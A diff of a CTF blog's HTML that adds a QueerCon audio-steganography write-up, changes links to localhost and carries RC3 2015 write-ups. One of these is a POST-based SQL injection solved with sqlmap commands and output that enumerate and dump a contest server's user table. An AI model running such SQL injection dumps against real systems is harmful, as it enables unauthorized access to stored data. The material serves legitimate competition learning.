@@ -81,7 +81,7 @@
     <div class="site-wrapper">
         
 
-<header class="main-header detail-page image-bg  has-cover" style=" background-size: 100% 100%; background-image: url(/images/cover.png)">
+<header class="main-header detail-page image-bg  has-cover" style=" background-size: cover; background-image: url(/images/cover.png)">
     <h1 class="page-title"><a href="/" title="Black Magic Exploitation">Black Magic Exploitation</a></h1>
     <h2 class="page-description">CTF's, Exploits, and Black Magic</h2>
     <div class="nav">
@@ -151,6 +151,238 @@
     <article class="post single-post" itemscope itemtype="http://schema.org/BlogPosting">
 
         <header class="post-header short-diver">
+            <h1 class="post-title" itemprop="name headline">QueerCon 2015 ~ QC13 Soundcheck: Stego	</h1>
+            <section class="post-meta">
+                <time datetime="2016-08-11T04:29:33-07:00" itemprop="datePublished">Aug 11, 2016</time> 
+                on
+                
+                <span><a href="">Stego</a></span>
+                
+                <span><a href="">QueerCon</a></span>
+                
+                <span><a href="">Crypto</a></span>
+                
+            </section>
+        </header>
+
+        <section class="post-content short-diver" itemprop="articleBody">
+            <p>For those that don’t know - QueerCon is an LGBTQ subgroup of DefCon, the worlds largest hacking convention in the world. Every year they have 1-3 challenges a year. This the first and can be located at the <a href="https://www.queercon.org/contests/2016/06/29/qc13-soundcheck/">QueerCon Contest Link</a> where I was able to win a QueerCon 13 Badge for this years DefCon.</p>
+
+<h2 id="contest-details"><strong>Contest Details</strong></h2>
+
+<pre><code>A beat to make you dance!
+
+Do you like music? Have a good ear? Check out this hot beat from Stemodity. Get prizes!
+
+Listen closely! Good luck!
+</code></pre>
+<figure>
+<p class="text-center"><iframe width="75%" height="166" style="border: none;" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/256697677&amp;color=ff5500&amp;auto_play=false&amp;hide_related=false&amp;show_comments=false&amp;show_user=true&amp;show_reposts=false&amp;download=true&amp;buying=false"></iframe></p>
+   <figcaption> Stemodity - Crypto </figcaption>
+</figure>
+
+<pre><code>Think you have solved the puzzle? Care to find out? 
+
+Send your find to answer (at) queercon (dot) org; and we will let you know.   
+
+Give up? Stay tuned for clues! They will be posted around in various places; such as on our Mobile App or Facebook page.  
+</code></pre>
+
+<p>Looks like we were given a song from Sound cloud. Given the clues, looks like there is some kind of hidden message in the song. Because the contest hinted:</p>
+
+<blockquote>
+  <p>Listen closely! Good luck!</p>
+</blockquote>
+
+<p>I turned on the song for the next four hours while solving this puzzle to make sure it got stuck in my head.</p>
+
+<p>Like any stego expert I downloaded the <a href="http://localhost:4000/assets/queercon/Crypto%20%5BQueerCon13%5D.mp3">full song</a> from SoundCloud and looked at its metadata using exiftool which I saved <a href="http://localhost:4000/assets/queercon/Metadata.txt">here</a></p>
+
+<figure>
+<script type="text/javascript" src="https://asciinema.org/a/82493.js" id="asciicast-82493" async=""></script>
+   <figcaption> Looking at the metadata</figcaption>
+</figure>
+
+<p>As you can see, we got nothing from here. Referencing a few audio <a href="https://github.com/ctfs/write-ups-2015/tree/master/polictf-2015/forensics/its-hungry">writeups</a>, I thought I should try looking at its spectrogram. Using sox, the swiss army knife for audio manipulation, I made a spectrogram for the song. I did have some issues using sox with mp3 but I referenced <a href="http://superuser.com/questions/421153/how-to-add-a-mp3-handler-to-sox/421168">this super user post</a> to convert it to a wav file or allow sox to run with mp3’s. After which I ran spectrogram command:</p>
+
+<figure>
+<script type="text/javascript" src="https://asciinema.org/a/c9ysl2rg2y2qixhgzd8btxlgh.js" id="asciicast-c9ysl2rg2y2qixhgzd8btxlgh" async=""></script>
+   <figcaption> Making the spectrogram</figcaption>
+</figure>
+
+<figure>
+   <img src="/images/queercon/spectrogram.png">
+   <figcaption>spectrogram.png</figcaption>
+</figure>
+
+<p>As you can see there are few areas where the signal magnitude values (dBFS) are super high (where its yellow). Next step is to isolate each of these areas using Sox. The command I used was:</p>
+
+<pre><code> sox &lt;audio file&gt; -n trim &lt;time&gt; &lt;duration&gt; spectrogram -o &lt;ouput file&gt;
+</code></pre>
+<blockquote>
+  <p>sox Crypto\ [QueerCon13].mp3 -n trim 1 1 spectrogram -o spectrogram-1-1.png</p>
+</blockquote>
+
+<blockquote>
+  <p>sox Crypto\ [QueerCon13].mp3 -n trim 10 5 spectrogram -o spectrogram-10-5.png</p>
+</blockquote>
+
+<blockquote>
+  <p>sox Crypto\ [QueerCon13].mp3 -n trim 65 5	 spectrogram -o spectrogram-65-5.png</p>
+</blockquote>
+
+<blockquote>
+  <p>sox Crypto\ [QueerCon13].mp3 -n trim 110 5 spectrogram -o spectrogram-110-5.png</p>
+</blockquote>
+
+<blockquote>
+  <p>sox Crypto\ [QueerCon13].mp3 -n trim 169 5 spectrogram -o spectrogram-169-5.png</p>
+</blockquote>
+
+<p>The results were:</p>
+
+<div class="album">
+   <figure>
+      <img src="http://localhost:4000/images/queercon/spectrogram-1-1.png">
+      <figcaption>spectrogram-1-1.png</figcaption>
+   </figure>
+   <figure>
+      <img src="http://localhost:4000/images/queercon/spectrogram-10-5.png">
+      <figcaption>spectrogram-10-5.png</figcaption>
+   </figure>
+    <figure>
+      <img src="http://localhost:4000/images/queercon/spectrogram-65-5.png">
+      <figcaption>spectrogram-65-5.png</figcaption>
+   </figure>   
+   <figure>
+      <img src="http://localhost:4000/images/queercon/spectrogram-110-5.png">
+      <figcaption>spectrogram-110-5.png</figcaption>
+   </figure>   
+   <figure>
+      <img src="http://localhost:4000/images/queercon/spectrogram-169-5.png">
+      <figcaption>spectrogram-169-5.png</figcaption>
+   </figure>
+</div>
+
+<p>This was amazingly hard to decipher so I pulled up <a href="http://www.sonicvisualiser.org/">Sonic Visualizer</a> which lets me see a live spectrogram. It also has more room for users to zoom in and out in the spectrogram. Usage: Open Audio File -&gt;  Shift + G (Spectrogram layer) -&gt; Double Click Bottom Right Visible Range scale to adjust to according dBFS level. This were the results:</p>
+
+<div class="album">
+   <figure>
+      <img src="http://localhost:4000/images/queercon/sonic1.png">
+      <figcaption>sonic1.png</figcaption>
+   </figure>
+   <figure>
+      <img src="http://localhost:4000/images/queercon/sonic2.png">
+      <figcaption>sonic2.png</figcaption>
+   </figure>
+    <figure>
+      <img src="http://localhost:4000/images/queercon/sonic3.png">
+      <figcaption>sonic3.png</figcaption>
+   </figure>   
+   <figure>
+      <img src="http://localhost:4000/images/queercon/sonic4.png">
+      <figcaption>sonic4.png</figcaption>
+   </figure>   
+   <figure>
+      <img src="http://localhost:4000/images/queercon/sonic5.png">
+      <figcaption>sonic5.png</figcaption>
+   </figure>
+</div>
+
+<p>My deciphering got me to think this text was:</p>
+
+<blockquote>
+  <p><strong>SALD LESUW TNDI UIKX NPTUC</strong></p>
+</blockquote>
+
+<p>At this point in time I wasted a whole bunch time with ciphers at <a href="http://rumkin.com/tools/cipher">http://rumkin.com/tools/cipher</a> such as caesars, vigenere…etc. Don’t get me wrong I know how most of these work, why rebuild the wheel? I didn’t really find anything here for a while. I tried other approaches such as looking at the metadata of the image that came along with the contest, but that didn’t give me anything either. I even listened to the song like 50 more times to see if I missed anything. You can say I wasted like four hours here:</p>
+
+<figure>
+   <img src="/images/queercon/musical_notes.jpg">
+   <figcaption>musical_notes.jpg</figcaption>
+</figure>
+
+<p>Thinking I missed something back at <a href="http://rumkin.com/tools/cipher">http://rumkin.com/tools/cipher</a>, I tried the ciphers again and eventually got a hit with the playfair cipher. <strong>NOTE: MAKE SURE YOU CHANGE TO DECRYPT INSTEAD OF ENCRYPT THE FIRST TIME TO MAKE SURE YOU DON’T WASTE FOUR HOURS TRYING OTHER CIPHERS</strong>. As such I input the text we had <em>SALD LESUW TNDI UIKX NPTUC</em> and I got:</p>
+
+<blockquote>
+  <p><strong>QCOA PARTY ROCK THIS HOUSE</strong></p>
+</blockquote>
+
+<p>Something was obviously wrong with the first word so I looked back the spectrograms and realized the “LD” in “SALD” was actually a “13” to make “SA13”. This translates the final ciphertext to:</p>
+
+<blockquote>
+  <p><strong>QC13 PARTY ROCK THIS HOUSE</strong></p>
+</blockquote>
+
+<p>This was the 13th year for QueerCon so this made sense. I emailed contests@queercon.org which resulted in no response for a couple weeks. After which I saw on the QueerCon Facebook page that many people didn’t get replies. I emailed one of the other QC ubers and was finally able to confirm I got the right answer along with a cool QC badge!</p>
+
+<figure>
+   <img src="/images/queercon/QC13-Badge.jpg">
+   <figcaption>QueerCon Badge <br> *Photo from hackaday by Eric Evenchick*</figcaption>
+</figure>
+
+<p>If you want a review of this year’s badge feel free to head to <a href="http://hackaday.com/2016/08/10/what-we-learned-from-the-2016-queercon-badge/">http://hackaday.com/2016/08/10/what-we-learned-from-the-2016-queercon-badge/</a></p>
+
+        </section>
+
+        <footer class="post-footer"> 
+            <div itemprop="author" itemscope itemtype="http://schema.org/Person">
+
+    
+
+    
+    
+
+    
+
+</div>
+        </footer>
+
+    </article>
+</main>
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <div class="pswp__bg"></div>
+    <div class="pswp__scroll-wrap">
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<main class="content" role="main">
+    <article class="post single-post" itemscope itemtype="http://schema.org/BlogPosting">
+
+        <header class="post-header short-diver">
             <h1 class="post-title" itemprop="name headline">RC3 2015 ~ Top Secret: Web 400</h1>
             <section class="post-meta">
                 <time datetime="2015-11-29T01:59:33-08:00" itemprop="datePublished">Nov 29, 2015</time> 
@@ -168,34 +400,34 @@
         </header>
 
         <section class="post-content short-diver" itemprop="articleBody">
-            <p><a href="https://viviturtle.github.io/images/rc3/TopSecret/start.png"><img src="https://viviturtle.github.io/images/rc3/TopSecret/start.png" alt="start"></a></p>
+            <p><a href="http://localhost:4000/images/rc3/TopSecret/start.png"><img src="http://localhost:4000/images/rc3/TopSecret/start.png" alt="start"></a></p>
 
 <p>This was a pretty fun Web CTF question. In short summary this question was a SQL Injection exploit that used cookies and post methods. Most people that know how to do basic SQL injections, will only know how to do it from the URL (GET Method). This one used POST. Luckily I knew how to do POST SQLi from my curiosity when I first learned it, and luckily I had pre-installed CO2 Burp extension for a previous competition, which made the SQL injection exploit very simple.</p>
 
 <p>We given a link <a href="http://162.243.171.85/">http://162.243.171.85/</a>. Upon visting the site we see a simple login.</p>
 
-<p><a href="https://viviturtle.github.io/images/rc3/TopSecret/start_web.png"><img src="https://viviturtle.github.io/images/rc3/TopSecret/start_web.png" alt="start_web"></a></p>
+<p><a href="http://localhost:4000/images/rc3/TopSecret/start_web.png"><img src="http://localhost:4000/images/rc3/TopSecret/start_web.png" alt="start_web"></a></p>
 
 <p>First thing you do for any Web Application Penetration Test is Recon and mapping. So I opened up Burp to record all my page visits, and used the web application normally. I registered for an account and looked at the default web page.</p>
 
-<p><a href="https://viviturtle.github.io/images/rc3/TopSecret/Default_web.png"><img src="https://viviturtle.github.io/images/rc3/TopSecret/Default_web.png" alt="Default_web"></a></p>
+<p><a href="http://localhost:4000/images/rc3/TopSecret/Default_web.png"><img src="http://localhost:4000/images/rc3/TopSecret/Default_web.png" alt="Default_web"></a></p>
 
 <p>We can clearly see three other pages. Home, Find Friends, and Logout. I tried a few of the pages.</p>
 
 <figure>
-   <img src="https://viviturtle.github.io/images/rc3/TopSecret/home.png">
+   <img src="http://localhost:4000/images/rc3/TopSecret/home.png">
    <figcaption>Home </figcaption>
 </figure>
 
 <figure>
-   <img src="https://viviturtle.github.io/images/rc3/TopSecret/friends.png">
+   <img src="http://localhost:4000/images/rc3/TopSecret/friends.png">
    <figcaption>Find Friends </figcaption>
 </figure>
 
 <p>The home page involves typing in some secret to store and displays it in a table. The Friends page shows other users. Trying to put it together, we need to find some way to get another person’s secret using the two pages. In other words, we need to find the admin’s secrets. After figuring this out, I tried to look at the actual requests.</p>
 
 <figure>
-   <img src="https://viviturtle.github.io/images/rc3/TopSecret/burp_friends.png">
+   <img src="http://localhost:4000/images/rc3/TopSecret/burp_friends.png">
    <figcaption>Friends Request</figcaption>
 </figure>
 
@@ -215,7 +447,7 @@ username=admin
 </code></pre>
 
 <figure>
-   <img src="https://viviturtle.github.io/images/rc3/TopSecret/burp_home.png">
+   <img src="http://localhost:4000/images/rc3/TopSecret/burp_home.png">
    <figcaption>Home Request</figcaption>
 </figure>
 
@@ -236,22 +468,22 @@ secret=apple
 
 <p>The only thing we should take note of, is that both of these pages use <strong>POST</strong> methods to retrieve data, where “secret” and “username” are the pieces of data being sent. We can also see there is a <strong>PHPSESSID</strong> to record the current user. Now let’s try some exploitation. First thing I tried was SQL injection. Let’s try escaping the SQL query using a <strong>‘</strong> character.</p>
 
-<p><a href="https://viviturtle.github.io/images/rc3/TopSecret/sqli.png"><img src="https://viviturtle.github.io/images/rc3/TopSecret/sqli.png" alt="sqli"></a></p>
+<p><a href="http://localhost:4000/images/rc3/TopSecret/sqli.png"><img src="http://localhost:4000/images/rc3/TopSecret/sqli.png" alt="sqli"></a></p>
 
 <p>This proves the Friends page is vulnerable to <strong>SQL injection</strong>. I right clicked on the request in Burp: Right Click &gt; Send to SQLMapper (a free Burp Extension by the CO2 Suite) and copied the SqlMap command. You will notice a data section for post parameters and a cookie value.</p>
 
-<p><a href="https://viviturtle.github.io/images/rc3/TopSecret/sqlmapper.png"><img src="https://viviturtle.github.io/images/rc3/TopSecret/sqlmapper.png" alt="sqlmapper"></a></p>
+<p><a href="http://localhost:4000/images/rc3/TopSecret/sqlmapper.png"><img src="http://localhost:4000/images/rc3/TopSecret/sqlmapper.png" alt="sqlmapper"></a></p>
 
 <pre><code>sqlmap -u 'http://162.243.171.85:80/find.php' --data='username=admin' --cookie='PHPSESSID=982677f8035354b556b6d80b00353187b77a997cd28e49bfda777e5c91f80dafc61114c392a70b95bd4fe12ddb727ab9f9d19032a8a21f393517af1635d24f9d'
 </code></pre>
 
 <p>Now to try the exploit.</p>
 
-<p><a href="https://viviturtle.github.io/images/rc3/TopSecret/dbs.png"><img src="https://viviturtle.github.io/images/rc3/TopSecret/dbs.png" alt="dbs"></a></p>
+<p><a href="http://localhost:4000/images/rc3/TopSecret/dbs.png"><img src="http://localhost:4000/images/rc3/TopSecret/dbs.png" alt="dbs"></a></p>
 
 <p>As you can see the application is clearly vulnerable and it works with SQLMap. If you don’t know what SQLmap it’s pretty much an automated tool to do SQL injectons. First I tested for database names (–dbs flag).</p>
 
-<p><a href="https://viviturtle.github.io/assets/rc3/TopSecret/dbs_output.txt">dbs_output.txt</a></p>
+<p><a href="http://localhost:4000/assets/rc3/TopSecret/dbs_output.txt">dbs_output.txt</a></p>
 
 <pre><code>viviturtle@vivi-laptop:~$ sqlmap -u 'http://162.243.171.85:80/find.php' --data='username=admin' --cookie='PHPSESSID=982677f8035354b556b6d80b00353187b77a997cd28e49bfda777e5c91f80dafc61114c392a70b95bd4fe12ddb727ab9f9d19032a8a21f393517af1635d24f9d' -p username --dbs
          _
@@ -302,7 +534,7 @@ available databases [2]:
 
 <p>It gave us the default database, information_schema and one other, TopSecret. Using the Top Secret Database, I tried to see what tables were in there; -D TopSecret –tables (-D to choose DB and –tables to find tables).</p>
 
-<p><a href="https://viviturtle.github.io/assets/rc3/TopSecret/table_output.txt">table_output.txt</a></p>
+<p><a href="http://localhost:4000/assets/rc3/TopSecret/table_output.txt">table_output.txt</a></p>
 
 <pre><code>viviturtle@vivi-laptop:~$ sqlmap -u 'http://162.243.171.85:80/find.php' --data='username=admin' --cookie='PHPSESSID=982677f8035354b556b6d80b00353187b77a997cd28e49bfda777e5c91f80dafc61114c392a70b95bd4fe12ddb727ab9f9d19032a8a21f393517af1635d24f9d' -p username -D TopSecret --tables
          _
@@ -355,7 +587,7 @@ Database: TopSecret
 
 <p>It had one table, users. Let’s dump this table:  -D TopSecret -T users –dump(-D to choose DB, -T to choose table and –dump to dump the table).</p>
 
-<p><a href="https://viviturtle.github.io/assets/rc3/TopSecret/dump.txt">dump.txt</a></p>
+<p><a href="http://localhost:4000/assets/rc3/TopSecret/dump.txt">dump.txt</a></p>
 
 <pre><code>viviturtle@vivi-laptop:~$ sqlmap -u 'http://162.243.171.85:80/find.php' --data='username=admin' --cookie='PHPSESSID=982677f8035354b556b6d80b00353187b77a997cd28e49bfda777e5c91f80dafc61114c392a70b95bd4fe12ddb727ab9f9d19032a8a21f393517af1635d24f9d' -p username -D TopSecret -T users --dump
          _
@@ -454,9 +686,9 @@ secret=test
 
 <p>Now look at the web application. It thinks we are the admin.</p>
 
-<p><a href="https://viviturtle.github.io/images/rc3/TopSecret/flag.png"><img src="https://viviturtle.github.io/images/rc3/TopSecret/flag.png" alt="flag"></a></p>
+<p><a href="http://localhost:4000/images/rc3/TopSecret/flag.png"><img src="http://localhost:4000/images/rc3/TopSecret/flag.png" alt="flag"></a></p>
 
-<p>The flag is <strong>RC3-SECRETSS-6277598130</strong>. Feel free to check out <a href="https://viviturtle.github.io/assets/rc3/TopSecret/sqlmap_notes.txt">sqlmap_notes.txt</a> to see the actual sqlmap requests.</p>
+<p>The flag is <strong>RC3-SECRETSS-6277598130</strong>. Feel free to check out <a href="http://localhost:4000/assets/rc3/TopSecret/sqlmap_notes.txt">sqlmap_notes.txt</a> to see the actual sqlmap requests.</p>
 
         </section>
 
@@ -537,11 +769,11 @@ secret=test
         </header>
 
         <section class="post-content short-diver" itemprop="articleBody">
-            <p><a href="https://viviturtle.github.io/images/rc3/OpenW0tM8/Start.png"><img src="https://viviturtle.github.io/images/rc3/OpenW0tM8/Start.png" alt="Start"></a></p>
+            <p><a href="http://localhost:4000/images/rc3/OpenW0tM8/Start.png"><img src="http://localhost:4000/images/rc3/OpenW0tM8/Start.png" alt="Start"></a></p>
 
 <p>This wasn’t so bad for a 400 Forensics question. I spent a good few hours trying to find the flag for this, even though it should of taken only 30 minutes.</p>
 
-<p>We are given a link to a pcap file: <a href="https://viviturtle.github.io/assets/rc3/for400.pcapng">for400.pcapng</a>. Whenever I do any CTF, I ALWAYS strings the file. Given that the string layout is “RC3-XXXXX-XXX”, I stringed the pcap file looking for “RC3” and flag”</p>
+<p>We are given a link to a pcap file: <a href="http://localhost:4000/assets/rc3/for400.pcapng">for400.pcapng</a>. Whenever I do any CTF, I ALWAYS strings the file. Given that the string layout is “RC3-XXXXX-XXX”, I stringed the pcap file looking for “RC3” and flag”</p>
 
 <blockquote>
   <table>
@@ -587,7 +819,7 @@ v4226 Successfully transferred "/flag"
 
 <p>Knowing this information, it was time to enter Wireshark, our great packet analysis tool and extract the data transfer. Upon opening the pcap, we can follow a few TCP streams (right click packet &gt; Follow TCP Stream) to find some kind of secure webchat on some website.</p>
 
-<p><a href="https://viviturtle.github.io/images/rc3/OpenW0tM8/Secure_chat.png"><img src="https://viviturtle.github.io/images/rc3/OpenW0tM8/Secure_chat.png" alt="Secure_chat"></a></p>
+<p><a href="http://localhost:4000/images/rc3/OpenW0tM8/Secure_chat.png"><img src="http://localhost:4000/images/rc3/OpenW0tM8/Secure_chat.png" alt="Secure_chat"></a></p>
 
 <pre><code>GET /licence/4427091/tunnel_callback.cgi?ya3hbWK4jtBrljUv0ZPN&amp;callback=_jqjsp&amp;command=IWCS0116C%5ES1445994676.f232961d2e%5E4427091%5E8%5E&amp;_1447612614575= HTTP/1.1
 Host: secure.livechatinc.com
@@ -609,7 +841,7 @@ Content-Encoding: gzip
 
 <p>Since we know that there was a file transfer for forFlag.image.tar.gz, we can assume the File Transfer Protocal (FTP) was used. Let’s look at some FTP Data. Around the 3000 packet mark, we find some FTP stuff.</p>
 
-<p><a href="https://viviturtle.github.io/images/rc3/OpenW0tM8/Flag.png"><img src="https://viviturtle.github.io/images/rc3/OpenW0tM8/Flag.png" alt="Flag"></a></p>
+<p><a href="http://localhost:4000/images/rc3/OpenW0tM8/Flag.png"><img src="http://localhost:4000/images/rc3/OpenW0tM8/Flag.png" alt="Flag"></a></p>
 
 <pre><code>211 End
 PWD
@@ -631,14 +863,14 @@ CWD flag
 
 <p>Looking inside the stream, we see that our strings data from earlier is here. Since we know the file was transferred around the 3000 mark, let’s look for the actual packet transfer in this range of packets. After finding it (TCP_Data), we can “Follow TCP Stream” for this file transfer. (Note we cannot export objects to get FTP data)</p>
 
-<p><a href="https://viviturtle.github.io/images/rc3/OpenW0tM8/data_raw.png"><img src="https://viviturtle.github.io/images/rc3/OpenW0tM8/data_raw.png" alt="data_raw"></a></p>
+<p><a href="http://localhost:4000/images/rc3/OpenW0tM8/data_raw.png"><img src="http://localhost:4000/images/rc3/OpenW0tM8/data_raw.png" alt="data_raw"></a></p>
 
 <pre><code>....^.DV.....\...?.g.].qu..HR5.b.MD.."..Yb... h4.$.....L.=Q../;;Y./5...^.B.k.^.&amp;.1..".h....!.wG.&amp;.K....4.}..].$.s.^{.\?.W....y....&lt;3...........mu..ba...e....[FF...s..u....5#S..9.s2.....s..[0.^.=.1w..................i.M.!.....?$._~..0_.....(...."..{....Pe2f..^..q...d..U..........5F....K..jkz........*.E.NQ[.PN?~.....[.b..2.l..+..,....wW.......}.....%...U...l..e...N....x..]...8..|2k...Gf......Z..f{.X.es..ha.......7l.F{.".7-.v.m....}.$.o.o.D.Z..._...........+.........l.rQ..h..MU;.UV.j.U....b
 </code></pre>
 
-<p>A whole bunch of gibberish, so we can assume this is some kind of non-ascii file. Since we know the flag is in this data, let’s save it as raw data and see what we can do to pull the flag from here. I saved it as <a href="https://viviturtle.github.io/assets/rc3/FTP_DATA_ORIGINAL">FTP_DATA</a> (In this case it’s saved as FTP_DATA_ORGINAL in this repo) and started analyzing the data.</p>
+<p>A whole bunch of gibberish, so we can assume this is some kind of non-ascii file. Since we know the flag is in this data, let’s save it as raw data and see what we can do to pull the flag from here. I saved it as <a href="http://localhost:4000/assets/rc3/FTP_DATA_ORIGINAL">FTP_DATA</a> (In this case it’s saved as FTP_DATA_ORGINAL in this repo) and started analyzing the data.</p>
 
-<p><a href="https://viviturtle.github.io/images/rc3/OpenW0tM8/Analysis.png"><img src="https://viviturtle.github.io/images/rc3/OpenW0tM8/Analysis.png" alt="Analysis"></a></p>
+<p><a href="http://localhost:4000/images/rc3/OpenW0tM8/Analysis.png"><img src="http://localhost:4000/images/rc3/OpenW0tM8/Analysis.png" alt="Analysis"></a></p>
 
 <p>Let’s dissect what we did here.</p>
 
@@ -704,7 +936,7 @@ I renamed it to TCP_DATA.tar and extracted it again.</p>
 3) binwalk
 4) Manual mount and analysis</p>
 
-<p>Using strings and foremost we didn’t find anything except a few htm’s and images. If you guys don’t know what foremost is, it’s a tool to carve out files from another file. It pretty much looks at header and footer bytes to check for file signatures. Looking into them didn’t really give me much. All of it is saved in the <a href="https://viviturtle.github.io/assets/rc3/output">output</a> folder.</p>
+<p>Using strings and foremost we didn’t find anything except a few htm’s and images. If you guys don’t know what foremost is, it’s a tool to carve out files from another file. It pretty much looks at header and footer bytes to check for file signatures. Looking into them didn’t really give me much. All of it is saved in the <a href="http://localhost:4000/assets/rc3/output">output</a> folder.</p>
 
 <p>Last thing I did was binwalk -e (-e for extract)</p>
 
@@ -712,20 +944,20 @@ I renamed it to TCP_DATA.tar and extracted it again.</p>
   <p>binwalk -e OpenW0tM8.image</p>
 </blockquote>
 
-<p><a href="https://viviturtle.github.io/images/rc3/OpenW0tM8/binwalk.png"><img src="https://viviturtle.github.io/images/rc3/OpenW0tM8/binwalk.png" alt="binwalk"></a></p>
+<p><a href="http://localhost:4000/images/rc3/OpenW0tM8/binwalk.png"><img src="http://localhost:4000/images/rc3/OpenW0tM8/binwalk.png" alt="binwalk"></a></p>
 
-<p>This gave us a bunch of files. A lot of it we can ignore. Towards the end we can see a few tar files. Upon opening the <a href="https://viviturtle.github.io/assets/rc3/576200.tar">576200.tar</a> file up, we get something very interesting. A <a href="https://viviturtle.github.io/assets/rc3/read">read</a> file, a <a href="https://viviturtle.github.io/assets/rc3/key">key</a>, <a href="https://viviturtle.github.io/assets/rc3/decme.enc">decme.enc</a>.</p>
+<p>This gave us a bunch of files. A lot of it we can ignore. Towards the end we can see a few tar files. Upon opening the <a href="http://localhost:4000/assets/rc3/576200.tar">576200.tar</a> file up, we get something very interesting. A <a href="http://localhost:4000/assets/rc3/read">read</a> file, a <a href="http://localhost:4000/assets/rc3/key">key</a>, <a href="http://localhost:4000/assets/rc3/decme.enc">decme.enc</a>.</p>
 
 <p><a href="read">read</a>
 &gt; openssl enc -d -in {encrypted file} -out {output file} -kfile {key} -aes-256-ecb</p>
 
-<p><a href="https://viviturtle.github.io/assets/rc3/key">key</a></p>
+<p><a href="http://localhost:4000/assets/rc3/key">key</a></p>
 
 <pre><code>60e9 8211 8077 1fc5 69b8 29f1 3e00 d8c2
 ce9a 7523 e8b7 44bc 48a4 3815 72b6 546a
 </code></pre>
 
-<p><a href="https://viviturtle.github.io/assets/rc3/decme.enc">decme.enc</a></p>
+<p><a href="http://localhost:4000/assets/rc3/decme.enc">decme.enc</a></p>
 
 <pre><code>Salted__vg*©ÄÛ»¡¿SÏÛÏðíïIÊÌd8³
 </code></pre>
@@ -806,17 +1038,17 @@ RC3-WOTM-8080
                 
                 <span><a href="">RC3</a></span>
                 
-                <span><a href="">Misc</a></span>
+                <span><a href="">Stego</a></span>
                 
             </section>
         </header>
 
         <section class="post-content short-diver" itemprop="articleBody">
-            <p><img src="https://viviturtle.github.io/images/rc3/start.png" alt="start"></p>
+            <p><img src="http://localhost:4000/images/rc3/start.png" alt="start"></p>
 
 <p>This was a super easy misc question. This should of been worth 150 or so points instead.</p>
 
-<p>We given a link to a document : <a href="https://viviturtle.github.io/assets/rc3/SECRETS.doc">SECRETS.doc</a>. Opening it up in LibreWriter or Microsoft office showed us some text.</p>
+<p>We given a link to a document : <a href="http://localhost:4000/assets/rc3/SECRETS.doc">SECRETS.doc</a>. Opening it up in LibreWriter or Microsoft office showed us some text.</p>
 
 <pre><code>TOP SECRET
 This document is full of top secret secrets that are property of RedTeamHackers. If you are not one of us (probably aren't so listen up), don't view the rest of this document. That would not be cool, and we will totally retaliate against you. 
@@ -990,13 +1222,13 @@ Smitty
         </header>
 
         <section class="post-content short-diver" itemprop="articleBody">
-            <p><a href="https://viviturtle.github.io/images/rc3/Goal/Start.png"><img src="https://viviturtle.github.io/images/rc3/Goal/Start.png" alt="Start"></a></p>
+            <p><a href="http://localhost:4000/images/rc3/Goal/Start.png"><img src="http://localhost:4000/images/rc3/Goal/Start.png" alt="Start"></a></p>
 
 <p>Another baby CTF question. It was very simple, even though it did throw me off quite a bit… We are given a link: <a href="http://129.21.39.225:82/">http://129.21.39.225:82/</a>. When visiting the site all it had was a gif of some guys playing soccer</p>
 
-<p><a href="https://viviturtle.github.io/images/rc3/Goal/goal.gif"><img src="https://viviturtle.github.io/images/rc3/Goal/goal.gif" alt="goal"></a></p>
+<p><a href="http://localhost:4000/images/rc3/Goal/goal.gif"><img src="http://localhost:4000/images/rc3/Goal/goal.gif" alt="goal"></a></p>
 
-<p>Maybe we should look at the <a href="https://viviturtle.github.io/assets/rc3/Goal/source.html">source</a>?</p>
+<p>Maybe we should look at the <a href="http://localhost:4000/assets/rc3/Goal/source.html">source</a>?</p>
 
 <pre><code class="language-html">&lt;html&gt;
 &lt;title&gt;GOOOOOAAAAALLLLLLLL!!!!!!!!!1&lt;/title&gt;
@@ -1035,9 +1267,9 @@ Duration                        : 4.68 s
 Image Size                      : 407x211
 </code></pre>
 
-<p>Nothing showed up there either. Luckily I always keep <strong>Burp Suite</strong> and <strong>Zap Proxy</strong> up. Let’s look at the <a href="https://viviturtle.github.io/assets/rc3/Goal/request">request</a>. I opened my Burp, searched for the ip address, searched for the page, and looked at the <a href="https://viviturtle.github.io/assets/rc3/Goal/request">request</a>.</p>
+<p>Nothing showed up there either. Luckily I always keep <strong>Burp Suite</strong> and <strong>Zap Proxy</strong> up. Let’s look at the <a href="http://localhost:4000/assets/rc3/Goal/request">request</a>. I opened my Burp, searched for the ip address, searched for the page, and looked at the <a href="http://localhost:4000/assets/rc3/Goal/request">request</a>.</p>
 
-<p><a href="https://viviturtle.github.io/images/rc3/Goal/Request.png"><img src="https://viviturtle.github.io/images/rc3/Goal/Request.png" alt="Request"></a></p>
+<p><a href="http://localhost:4000/images/rc3/Goal/Request.png"><img src="http://localhost:4000/images/rc3/Goal/Request.png" alt="Request"></a></p>
 
 <pre><code>GET http://129.21.39.225:82/ HTTP/1.1
 Host: 129.21.39.225:82
@@ -1048,9 +1280,9 @@ Accept-Encoding: gzip, deflate
 Connection: keep-alive
 </code></pre>
 
-<p>Everything looks normal there. Now let’s look at the <a href="https://viviturtle.github.io/assets/rc3/Goal/response">response</a> from the web server.</p>
+<p>Everything looks normal there. Now let’s look at the <a href="http://localhost:4000/assets/rc3/Goal/response">response</a> from the web server.</p>
 
